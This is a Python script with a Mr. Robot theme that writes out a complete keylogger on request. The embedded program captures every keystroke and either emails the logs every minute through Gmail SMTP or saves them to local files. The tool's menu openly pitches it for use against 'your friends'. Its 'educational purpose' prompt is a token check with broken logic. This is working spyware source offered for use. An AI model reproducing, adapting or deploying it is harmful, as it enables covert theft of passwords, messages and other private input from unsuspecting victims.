import os
if ModuleNotFoundError:
    os.system("pip install halo")
    os.system("pip3 install keyboard")
from time import sleep
from halo import Halo

keyloggerscript = """
import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "enteryouremail@gmail.com"
EMAIL_PASSWORD = "yourpassword"
# dont worry you are going to be the only one who can read this information 

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):

        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):

        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        # manages a connection to the SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):

        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you want to print in the console, uncomment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()"""


def spinnyshit():
    spinner = Halo(text='Loading', spinner='dots')
    spinner.start()
    sleep(3)
    spinner.stop()


def edu_purpose():
    white_hat = input("<D0loresH4ze> Are You going to use this with educational purpose? \n\n\n<samsepi0l> ")
    if white_hat.lower() == "no" or white_hat.lower() == "n":
        print("I guess you can't use this tool tho :(")
        exit()
    elif white_hat.lower() == "y" and white_hat.lower() == "yes":
        pass


def header():
    os.system("cls")
    print("""
     /$$   /$$           /$$ /$$                       
    | $$  | $$          | $$| $$                       
    | $$  | $$  /$$$$$$ | $$| $$  /$$$$$$              
    | $$$$$$$$ /$$__  $$| $$| $$ /$$__  $$             
    | $$__  $$| $$$$$$$$| $$| $$| $$  \ $$             
    | $$  | $$| $$_____/| $$| $$| $$  | $$             
    | $$  | $$|  $$$$$$$| $$| $$|  $$$$$$/             
    |__/  |__/ \_______/|__/|__/ \______/              
                                                       
                                                       
                                                       
     /$$$$$$$$        /$$                           /$$
    | $$_____/       |__/                          | $$
    | $$     /$$$$$$  /$$  /$$$$$$  /$$$$$$$   /$$$$$$$
    | $$$$$ /$$__  $$| $$ /$$__  $$| $$__  $$ /$$__  $$
    | $$__/| $$  \__/| $$| $$$$$$$$| $$  \ $$| $$  | $$
    | $$   | $$      | $$| $$_____/| $$  | $$| $$  | $$
    | $$   | $$      | $$|  $$$$$$$| $$  | $$|  $$$$$$$
    |__/   |__/      |__/ \_______/|__/  |__/ \_______/
                                                       
                                                       
                                                       
    \n""")


def fsociety():
    os.system("cls")
    print("""
        XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
        XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
        XX                                                                          XX
        XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
        XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
        XX   MMMMMy''                                                    ''yMMMMM   XX
        XX   MMMy'                                                          'yMMM   XX
        XX   Mh'                                                              'hM   XX
        XX   -                                                                  -   XX
        XX                                                                          XX
        XX   ::                                                                ::   XX
        XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
        XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
        XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
        XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
        XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
        XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
        XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
        XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
        XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
        XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
        XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
        XX                                oo      oo                                XX
        XX           oM                 oo          oo                 Mo           XX
        XX         oMMo                M              M                oMMo         XX
        XX       +MMMM                 s              s                 MMMM+       XX
        XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
        XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
        XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
        XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
        XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
        XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
        XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
        XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
        XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
        XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
        XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
        XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
        XX   MMMMMMMM-                                                  -MMMMMMMM   XX
        XX   MMMMMMMMM                                                  MMMMMMMMM   XX
        XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
        XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
        XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
        XX                                                                          XX
        XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
        XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

            .o88o.                               o8o                .
            888 `"                               `"'              .o8
           o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
            888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
            888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
            888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
           o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'
                                                                        .o...P'
                                                                        `XER0'
        -made by IULITIME-\n\n""")


def menu():
    create_keylogger = input("<D0loresH4ze> Would you like to make a keylogger to kick the"
                             " shit out of your friends? [Y/N] \n\n<samsepi0l> ")
    while create_keylogger.lower() != "y":
        print("\n<D0loresH4ze> Okey friend, GoodBye...")
        sleep(3)
        os.system("cls")
        exit()
    print("\n<D0loresH4ze> "
          "This program will work via email, it means that you are going to get all the keylogs in your email\n")
    pass


def create_file():
    name_file = input(
        "\n<D0loresH4ze> how would you like to name your file? \n\n"
        "<samsepi0l> ")

    hacker_file = open(name_file + ".py", "w")
    hacker_file.write(keyloggerscript)
    spinnyshit()
    return hacker_file


def thanks():
    fsociety()
    print("<D0loresH4ze> your keylogger has been succesfully created!")
    spinnyshit()
    sleep(1)
    fsociety()
    print("<D0loresH4ze> please go to the .py that you just created and edit it writing your email")


def exitgate():
    input("\nPress ENTER to exit\n")
    os.system("cls")
    print("""
      /$$$$$$                            /$$ /$$$$$$$                     
     /$$__  $$                          | $$| $$__  $$                    
    | $$  \__/  /$$$$$$   /$$$$$$   /$$$$$$$| $$  \ $$ /$$   /$$  /$$$$$$ 
    | $$ /$$$$ /$$__  $$ /$$__  $$ /$$__  $$| $$$$$$$ | $$  | $$ /$$__  $$
    | $$|_  $$| $$  \ $$| $$  \ $$| $$  | $$| $$__  $$| $$  | $$| $$$$$$$$
    | $$  \ $$| $$  | $$| $$  | $$| $$  | $$| $$  \ $$| $$  | $$| $$_____/
    |  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$$| $$$$$$$/|  $$$$$$$|  $$$$$$$
     \______/  \______/  \______/  \_______/|_______/  \____  $$ \_______/
                                                       /$$  | $$          
                                                      |  $$$$$$/          
                                                       \______/           
     /$$$$$$$$        /$$                           /$$                   
    | $$_____/       |__/                          | $$                   
    | $$     /$$$$$$  /$$  /$$$$$$  /$$$$$$$   /$$$$$$$                   
    | $$$$$ /$$__  $$| $$ /$$__  $$| $$__  $$ /$$__  $$                   
    | $$__/| $$  \__/| $$| $$$$$$$$| $$  \ $$| $$  | $$                   
    | $$   | $$      | $$| $$_____/| $$  | $$| $$  | $$                   
    | $$   | $$      | $$|  $$$$$$$| $$  | $$|  $$$$$$$                   
    |__/   |__/      |__/ \_______/|__/  |__/ \_______/                   
                                                                          
                                                                          
                                                                          
        -F society is watching-
    \n""")
    exit()


def main():
    header()
    edu_purpose()
    spinnyshit()
    fsociety()
    menu()
    create_file()
    thanks()
    exitgate()


if __name__ == '__main__':
    main()
